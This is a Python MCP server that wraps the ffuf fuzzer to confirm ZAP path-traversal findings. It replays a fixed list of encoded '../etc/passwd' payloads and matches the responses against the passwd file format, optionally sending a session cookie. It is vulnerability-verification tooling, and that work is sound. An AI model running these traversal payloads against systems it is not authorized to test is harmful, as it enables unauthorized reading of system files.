"""stdio MCP wrapper around ffuf: confirm ZAP's path-traversal findings by replaying a
small fixed set of traversal payloads and matching the ``/etc/passwd`` shape.

Passwd-shaped response → CONFIRMED; all payloads ran and none matched → REFUTED;
timeout/error or requests that never reached the target → INCONCLUSIVE (ffuf exits 0
either way, so a refutation that tested nothing is otherwise indistinguishable). FUZZ
replaces the query value when the flagged parameter is in the query, else the last path
segment; the wordlist is fed on stdin so nothing is mounted.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

sys.path.insert(0, str(Path(__file__).resolve().parent))

from _dispatch_common import (  # noqa: E402
    CONFIRMED,
    INCONCLUSIVE,
    REFUTED,
    outcome,
    run_container,
    warning_lines,
)
from mcp.server import MCPServer  # noqa: E402

#: Pinned, arm64-native. Never ``:latest``.
FFUF_IMAGE = "secsi/ffuf:2.2.1@sha256:eb69340b78ad7d5cab51cc1f46c673fb9cb94eea87ee43eb933ef308b8bc2fce"

#: Response body regex that ffuf matches on — the unmistakable shape of a
#: readable ``/etc/passwd``. Specific on purpose: a traversal that returns
#: anything else is not a confirmed file read.
PASSWD_REGEX = "root:.*:0:0:"

#: A small, high-signal traversal wordlist covering depth and a couple of
#: common encodings/bypasses. Confirmation, not discovery, so it stays short.
TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd",
]

#: Phrases ffuf prints when its requests did not reach the target. ffuf exits
#: ``0`` even when every request errored, so without this a target that was down,
#: unresolvable or refusing connections would produce a clean :data:`REFUTED` for
#: every traversal finding — the same silent-false-refutation shape as an empty
#: nuclei template set, and the reason both are checked explicitly rather than
#: through the exit code.
REQUESTS_FAILED = (
    "connection refused",
    "no such host",
    "context deadline exceeded",
    "connection reset",
    "errored:",
)

srv = MCPServer("ffuf-verify", version="0.1.0")


def _fuzz_url(target: str, param: str) -> tuple[str, str]:
    """Place the ``FUZZ`` keyword and report where it landed.

    :returns: ``(url_with_FUZZ, injection_point_description)``.
    """
    parsed = urlparse(target)
    query = parse_qsl(parsed.query, keep_blank_values=True)
    if param and any(k == param for k, _ in query):
        new_query = [(k, "FUZZ" if k == param else v) for k, v in query]
        rebuilt = parsed._replace(query=urlencode(new_query, safe="FUZZ"))
        return urlunparse(rebuilt), f"query parameter {param!r}"

    # No matching query parameter: fuzz the final path segment, which is where
    # Gitea's path parameters live.
    segments = parsed.path.split("/")
    if segments and segments[-1]:
        segments[-1] = "FUZZ"
    else:
        segments.append("FUZZ")
    rebuilt = parsed._replace(path="/".join(segments))
    return urlunparse(rebuilt), "final path segment"


@srv.tool(
    description=(
        "Replay directory-traversal payloads with ffuf to confirm or refute a "
        "path-traversal finding, matching the response against /etc/passwd. "
        "Returns a four-state outcome with the winning payload as evidence."
    )
)
def verify_ffuf(
    target: str,
    param: str = "",
    method: str = "GET",
    timeout: int = 120,
    cookie: str = "",
) -> dict:
    """Verify one path-traversal finding.

    :param target: the full URL ZAP flagged.
    :param param: the flagged parameter; decides where ``FUZZ`` is placed.
    :param method: recorded for provenance (ffuf fuzzes with GET here).
    :param timeout: per-invocation ceiling; a kill maps to inconclusive.
    :param cookie: an authenticated session cookie to send (``name=value``),
        so traversal behind login is reachable. Empty for an anonymous probe.
    """
    fuzz_url, injection_point = _fuzz_url(target, param)
    args = [
        "-w", "-",
        "-u", fuzz_url,
        "-mr", PASSWD_REGEX,
        "-of", "json",
        "-o", "/dev/stdout",
        "-s",  # silent: no progress noise on stdout
    ]
    if cookie:
        args += ["-H", f"Cookie: {cookie}"]
    wordlist = ("\n".join(TRAVERSAL_PAYLOADS) + "\n").encode()

    result = run_container(FFUF_IMAGE, args, timeout=timeout, stdin=wordlist)
    if result.timed_out:
        return outcome(
            INCONCLUSIVE, "ffuf", result,
            f"ffuf killed at the {timeout}s timeout before finishing — unknown, "
            "not refuted",
            tested=False,
        )

    matches = _matched_payloads(result.stdout)
    if matches:
        return outcome(
            CONFIRMED, "ffuf", result,
            f"traversal payload returned /etc/passwd content via the {injection_point}",
            evidence=", ".join(matches),
        )
    failures = warning_lines(f"{result.stdout}\n{result.stderr}",
                             REQUESTS_FAILED, marker="")
    if failures:
        return outcome(
            INCONCLUSIVE, "ffuf", result,
            f"ffuf could not reach the target ({failures[0]}) — no payload was "
            "actually tested, so this is unknown, not a refutation",
            warnings=failures, tested=False,
        )
    if result.exit_code == 0:
        return outcome(
            REFUTED, "ffuf", result,
            f"no traversal payload read /etc/passwd via the {injection_point}",
        )
    return outcome(
        INCONCLUSIVE, "ffuf", result,
        f"ffuf exited {result.exit_code} without a clean result",
        tested=False,
    )


def _matched_payloads(stdout: str) -> list[str]:
    """The FUZZ values ffuf reported as matches, from its JSON output."""
    stdout = stdout.strip()
    if not stdout:
        return []
    # ffuf writes progress lines before the JSON blob when not fully silent;
    # take the last balanced JSON object.
    start = stdout.find("{")
    if start == -1:
        return []
    try:
        report = json.loads(stdout[start:])
    except json.JSONDecodeError:
        return []
    return [
        str(r.get("input", {}).get("FUZZ") or "?")
        for r in report.get("results", [])
    ]


if __name__ == "__main__":
    srv.run("stdio")
